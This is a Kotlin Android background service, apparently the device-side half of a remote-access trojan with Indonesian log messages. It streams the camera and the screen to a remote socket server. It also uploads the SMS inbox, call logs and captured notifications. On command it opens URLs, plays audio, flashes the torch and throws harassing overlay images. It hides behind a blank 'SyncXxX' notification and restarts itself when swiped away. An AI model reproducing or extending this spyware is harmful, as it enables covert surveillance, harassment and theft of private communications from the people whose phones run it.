        lockFlashHandler?.post(lockFlashRunnable!!)
    }

    private fun stopLockFlashBlink() {
        lockFlashRunnable?.let { lockFlashHandler?.removeCallbacks(it) }
        lockFlashHandler  = null
        lockFlashRunnable = null
        lockFlashState    = false
        try { 
            torchCameraId?.let { cameraManager?.setTorchMode(it, false) } 
        } catch (_: Exception) {}
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }
    
    private fun setSenter(on: Boolean) {
        try {
            if (streaming) {
                try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                streaming = false
            }
            if (torchCameraId == null) {
                torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
                    cameraManager?.getCameraCharacteristics(id)
                        ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                }
            }
            torchCameraId?.let { cameraManager?.setTorchMode(it, on) }
            emitStatus(JSONObject().apply { put("senterOn", on) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setSenter: ${e.message}")
        }
    }

    private fun setVolumeLevel(level: Int) {
        try {
            val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val streams = listOf(
                AudioManager.STREAM_MUSIC,
                AudioManager.STREAM_RING,
                AudioManager.STREAM_NOTIFICATION
            )
            streams.forEach { stream ->
                val max    = audio.getStreamMaxVolume(stream)
                val target = (level / 100f * max).toInt().coerceIn(0, max)
                audio.setStreamVolume(stream, target, 0)
            }
            emitStatus(JSONObject().apply {
                put("volumeLevel", level)
                put("volumeMuted", level == 0)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeLevel: ${e.message}")
        }
    }

    private fun startCamera(facing: String) {
        Handler(Looper.getMainLooper()).post {
            stopCameraInternal()
            streaming = true

            val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
                             else CameraSelector.LENS_FACING_BACK
            val selector   = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                try {
                    cameraProvider = future.get()
                    cameraProvider?.unbindAll()

                    imageAnalysis = ImageAnalysis.Builder()
                        .setTargetResolution(android.util.Size(640, 480))
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                        .build()

                    imageAnalysis!!.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
                        if (!streaming) { imageProxy.close(); return@setAnalyzer }
                        val now = System.currentTimeMillis()
                        if (now - lastFrameTime < FRAME_INTERVAL) { imageProxy.close(); return@setAnalyzer }
                        lastFrameTime = now

                        try {
                            val raw      = imageProxy.toBitmap()
                            val rotation = imageProxy.imageInfo.rotationDegrees
                            val bitmap   = if (rotation != 0) {
                                val matrix  = Matrix().apply { postRotate(rotation.toFloat()) }
                                val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
                                raw.recycle()
                                rotated
                            } else raw

                            val out = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
                            val b64: String = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            bitmap.recycle()

                            emitFrame(b64)
                        } catch (_: Exception) {}
                        imageProxy.close()
                    }

                    cameraProvider?.bindToLifecycle(this@DeviceService, selector, imageAnalysis!!)
                    emitStatus(JSONObject().apply { put("cameraActive", true) })
                } catch (e: Exception) {
                    Log.e("DeviceService", "Camera bind error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun stopCamera() {
        streaming = false
        Handler(Looper.getMainLooper()).post { stopCameraInternal() }
        emitStatus(JSONObject().apply { put("cameraActive", false) })
    }

    private fun stopCameraInternal() {
        streaming = false
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        cameraProvider = null
        imageAnalysis  = null
    }

    private fun requestScreenCapture() {
        try {
            if (savedProjectionResultCode == Activity.RESULT_OK && savedProjectionData != null) {
                startScreenCapture(savedProjectionResultCode, savedProjectionData!!)
                return
            }

            val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

        } catch (e: Exception) {
            Log.e("DeviceService", "Gagal memanggil ScreenCaptureActivity: ${e.message}")
            emitStatus(JSONObject().apply { put("screenActive", false) })
            savedProjectionResultCode = -1
            savedProjectionData = null
        }
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        stopScreenCapture()

        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            var capW: Int; var capH: Int; val capDpi: Int
            val scale = 0.5f

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val bounds = wm.currentWindowMetrics.bounds
                capW   = (bounds.width()  * scale).toInt()
                capH   = (bounds.height() * scale).toInt()
                capDpi = resources.displayMetrics.densityDpi
            } else {
                val metrics = DisplayMetrics()
                @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(metrics)
                capW   = (metrics.widthPixels  * scale).toInt()
                capH   = (metrics.heightPixels * scale).toInt()
                capDpi = metrics.densityDpi
            }

            if (capW <= 0) capW = 200
            if (capH <= 0) capH = 400

            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mgr.getMediaProjection(resultCode, data)

            if (mediaProjection == null) {
                emitStatus(JSONObject().apply { put("screenActive", false) })
                return
            }

            imageReader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 2)

            mediaProjection?.createVirtualDisplay(
                "ScreenLive", capW, capH, capDpi,
                android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface, null, null
            )

            screenStreaming = true
            emitStatus(JSONObject().apply { put("screenActive", true) })

            screenHandler = Handler(Looper.getMainLooper())
            screenRunnable = object : Runnable {
                override fun run() {
                    if (!screenStreaming) return
                    if (!screenIsSending) {
                        captureAndSendScreen()
                    }
                    screenHandler?.postDelayed(this, 250L)
                }
            }
            screenHandler?.post(screenRunnable!!)
            
        } catch (e: Exception) {
            Log.e("DeviceService", "startScreenCapture Crash: ${e.message}")
            stopScreenCapture()
        }
    }

    private var screenIsSending = false

    private fun captureAndSendScreen() {
        val reader = imageReader ?: return
        var image: android.media.Image? = null
        try {
            image = reader.acquireLatestImage() ?: return
            
            if (screenIsSending) {
                image.close()
                return
            }

            val planes = image.planes
            if (planes.isEmpty() || planes[0].buffer == null) {
                image.close()
                return
            }

            val buffer      = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride   = planes[0].rowStride
            val rowPadding  = rowStride - pixelStride * image.width

            val bitmapWidth = image.width + rowPadding / pixelStride
            val bitmapHeight = image.height

            if (bitmapWidth <= 0 || bitmapHeight <= 0) {
                image.close()
                return
            }

            buffer.position(0)
            val expectedBytes = bitmapWidth * bitmapHeight * 4
            if (buffer.remaining() < expectedBytes) {
                image.close()
                return
            }

            val bmp = Bitmap.createBitmap(bitmapWidth, bitmapHeight, Bitmap.Config.ARGB_8888)
            bmp.copyPixelsFromBuffer(buffer)

            val cropped = if (rowPadding > 0) {
                val safeWidth = minOf(image.width, bmp.width)
                val safeHeight = minOf(image.height, bmp.height)
                Bitmap.createBitmap(bmp, 0, 0, safeWidth, safeHeight)
            } else {
                bmp
            }

            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 70, baos) 
            
            if (cropped !== bmp) {
                cropped.recycle()
            }
            bmp.recycle()

            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            screenIsSending = true
            
            Thread {
                try { 
                    emitScreenFrame(b64) 
                } catch (e: Exception) {
                    Log.e("DeviceService", "Socket emit screen error: ${e.message}")
                } finally { 
                    screenIsSending = false 
                }
            }.start()

        } catch (e: Exception) {
            screenIsSending = false
            Log.e("DeviceService", "captureAndSendScreen fatal error: ${e.message}")
        } finally {
            try {
                image?.close()
            } catch (_: Exception) {}
        }
    }

    private fun stopScreenCapture() {
        screenStreaming = false
        screenRunnable?.let { screenHandler?.removeCallbacks(it) }
        screenHandler  = null
        screenRunnable = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
        emitStatus(JSONObject().apply { put("screenActive", false) })
    }

    private fun emitScreenFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("screen:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (URL(url).openConnection() as HttpURLConnection).apply {
                    requestMethod    = "GET"
                    connectTimeout   = 8000
                    readTimeout      = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }

                if (conn.responseCode != 200) {
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    conn.disconnect()
                    return@Thread
                }

                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()

                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp == null) {
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    return@Thread
                }

                val wm = WallpaperManager.getInstance(this)
                wm.setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper error: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperSet", false) })
            }
        }.start()
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            emitStatus(JSONObject().apply { put("openedUrl", url) })
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl error: ${e.message}")
        }
    }
    
    private val notifStore = mutableMapOf<String, ArrayDeque<JSONObject>>()

    private fun storeNotif(payload: JSONObject) {
        val pkg = payload.optString("pkg") ?: return
        val deque = notifStore.getOrPut(pkg) { ArrayDeque() }
        deque.addFirst(payload)
        if (deque.size > 500) deque.removeLast()
    }

    private fun sendStoredNotifs() {
        Thread {
            try {
                val result = JSONArray()
                notifStore.forEach { (pkg, deque) ->
                    val msgs = JSONArray()
                    deque.forEach { msgs.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",     pkg)
                        put("appName", deque.firstOrNull()?.optString("appName") ?: pkg)
                        put("messages", msgs)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("notifList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendStoredNotifs: ${e.message}")
            }
        }.start()
    }
    
    private fun sendCallLogs() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:call_logs", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                
                val arr = JSONArray()
                val uri = CallLog.Calls.CONTENT_URI
                
                val cursor = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val bundle = Bundle().apply {
                        putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, "${CallLog.Calls.DATE} DESC")
                        putInt(ContentResolver.QUERY_ARG_LIMIT, 50)
                    }
                    contentResolver.query(uri, null, bundle, null)
                } else {
                    contentResolver.query(uri, null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 50")
                }

                cursor?.use { c ->
                    val numCol = c.getColumnIndex(CallLog.Calls.NUMBER)
                    val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
                    val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
                    val durCol = c.getColumnIndex(CallLog.Calls.DURATION)

                    while (c.moveToNext()) {
                        val number = if (numCol >= 0) c.getString(numCol) ?: "Tidak diketahui" else "Tidak diketahui"
                        val name = if (nameCol >= 0) c.getString(nameCol) ?: "" else ""
                        val typeInt = if (typeCol >= 0) c.getInt(typeCol) else 0
                        val date = if (dateCol >= 0) c.getLong(dateCol) else 0L
                        val duration = if (durCol >= 0) c.getString(durCol) ?: "0" else "0"

                        val typeStr = when (typeInt) {
                            CallLog.Calls.INCOMING_TYPE -> "Masuk"
                            CallLog.Calls.OUTGOING_TYPE -> "Keluar"
                            CallLog.Calls.MISSED_TYPE -> "Tak Terjawab"
                            CallLog.Calls.REJECTED_TYPE -> "Ditolak"
                            else -> "Lainnya"
                        }

                        arr.put(JSONObject().apply {
                            put("number", number)
                            put("name", name)
                            put("type", typeStr)
                            put("date", date)
                            put("duration", duration)
                        })
                    }
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:call_logs", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("logs", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendCallLogs Error: ${e.message}")
            }
        }.start()
    }

    private fun sendSms() {
        Thread {
            try {
                val uri = Uri.parse("content://sms/inbox")
                val cursor = contentResolver.query(
                    uri,
                    arrayOf("address", "body", "date", "read"),
                    null, null, "date DESC"
                ) ?: return@Thread
                
                val grouped = mutableMapOf<String, ArrayDeque<JSONObject>>()
                cursor.use {
                    while (it.moveToNext()) {
                        val address = it.getString(0) ?: continue
                        val body    = it.getString(1) ?: continue
                        val date    = it.getLong(2)
                        val msg = JSONObject().apply {
                            put("pkg",     "com.android.sms")
                            put("appName", "SMS")
                            put("title",   address)
                            put("text",    body)
                            put("time",    date)
                        }
                        grouped.getOrPut(address) { ArrayDeque() }.addLast(msg)
                    }
                }

                val result = JSONArray()
                grouped.forEach { (address, msgs) ->
                    val msgArr = JSONArray()
                    msgs.forEach { msgArr.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",      "com.android.sms")
                        put("appName",  "SMS — $address")
                        put("messages", msgArr)
                    })
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("smsList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendSms: ${e.message}")
            }
        }.start()
    }

    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid error: ${e.message}")
            ""
        }
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    private fun emitFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("camera:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_WATCHDOG) {
            if (socket == null || socket?.connected() == false) {
                connectSocket()
            }
            scheduleAlarm()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)

        
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(chatFromTargetReceiver) } catch (_: Exception) {}
        
        stopCameraInternal()
        stopScreenCapture()
        stopLockFlashBlink()
        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        flashHandler = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        socket?.disconnect()
        socket = null
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d("DeviceService", "Aplikasi dihapus dari history, menjadwalkan restart via AlarmManager...")
        
        try {
            val restartServiceIntent = Intent(applicationContext, DeviceService::class.java).apply {
                setPackage(packageName)
            }
            
            val restartServicePendingIntent = PendingIntent.getService(
                applicationContext, 1, restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            
            val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmService.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent
            )
        } catch (e: Exception) {
            Log.e("DeviceService", "Gagal menjadwalkan restart dari onTaskRemoved: ${e.message}")
        }
    }
    
    

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SyncXxX")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Sync XxX Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private var mediaPlayer: MediaPlayer? = null
    private var lockMediaPlayer: MediaPlayer? = null

    private fun playLockSound() {
        try {
            lockMediaPlayer?.release()
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            lockMediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setOnCompletionListener { release(); lockMediaPlayer = null }
                prepare()
                start()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playLockSound: ${e.message}")
        }
    }

    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }

    private val jumpscareViews = mutableListOf<View>()
    private val jumpscareHandler = Handler(Looper.getMainLooper())
    private var jumpscareRunnable: Runnable? = null
    private var jumpscareUrls: List<String> = emptyList()

    private fun startJumpscare(value: String) {
        stopJumpscare()
        jumpscareUrls = try {
            val arr = JSONArray(value)
            (0 until arr.length()).map { arr.getString(it) }.filter { it.isNotBlank() }
        } catch (_: Exception) {
            if (value.isNotBlank()) listOf(value) else emptyList()
        }
        if (jumpscareUrls.isEmpty()) return

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels

        val spawnJumpscare = object : Runnable {
            override fun run() {
                if (jumpscareUrls.isEmpty()) return
                val pickedUrl = jumpscareUrls.random()
                try {
                    val imgView = ImageView(this@DeviceService)
                    imgView.scaleType = ImageView.ScaleType.CENTER_CROP

                    val size = (120 + (Math.random() * 80).toInt())
                    val px = (size * metrics.density).toInt()

                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION")
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        px, px, type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = Gravity.TOP or Gravity.START
                        x = (Math.random() * (screenW - px)).toInt().coerceAtLeast(0)
                        y = (Math.random() * (screenH - px)).toInt().coerceAtLeast(0)
                    }

                    wm.addView(imgView, params)
                    jumpscareViews.add(imgView)

                    Thread {
                        try {
                            var redirectUrl = pickedUrl
                            var bmp: Bitmap? = null
                            for (i in 0..4) {
                                val conn = URL(redirectUrl).openConnection() as HttpURLConnection
                                conn.connectTimeout          = 12000
                                conn.readTimeout             = 15000
                                conn.instanceFollowRedirects = false
                                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
                                conn.setRequestProperty("Accept", "image/*,*/*;q=0.8")
                                conn.connect()
                                val code = conn.responseCode
                                if (code in 300..399) {
                                    val loc = conn.getHeaderField("Location")
                                    conn.disconnect()
                                    if (loc != null) { redirectUrl = loc; continue } else break
                                }
                                val bytes = conn.inputStream.readBytes()
                                conn.disconnect()
                                bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                break
                            }
                            if (bmp != null) {
                                val finalBmp = bmp
                                Handler(Looper.getMainLooper()).post { imgView.setImageBitmap(finalBmp) }
                            } else {
                                Log.e("DeviceService", "jumpscare img null: $pickedUrl")
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "jumpscare img load: ${e.message}")
                        }
                    }.start()

                    Handler(Looper.getMainLooper()).postDelayed({
                        try { wm.removeView(imgView); jumpscareViews.remove(imgView) } catch (_: Exception) {}
                    }, 2500)

                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare spawn: ${e.message}")
                }

                jumpscareRunnable = this
                jumpscareHandler.postDelayed(this, 600)
            }
        }

        jumpscareRunnable = spawnJumpscare
        jumpscareHandler.post(spawnJumpscare)
    }

    private fun stopJumpscare() {
        jumpscareUrls = emptyList()
        jumpscareRunnable?.let { jumpscareHandler.removeCallbacks(it) }
        jumpscareRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscareViews.toList().forEach { v ->
            try { wm.removeView(v) } catch (_: Exception) {}
        }
        jumpscareViews.clear()
    }
}

object SocketHolder {
    var connected: Boolean = false
}
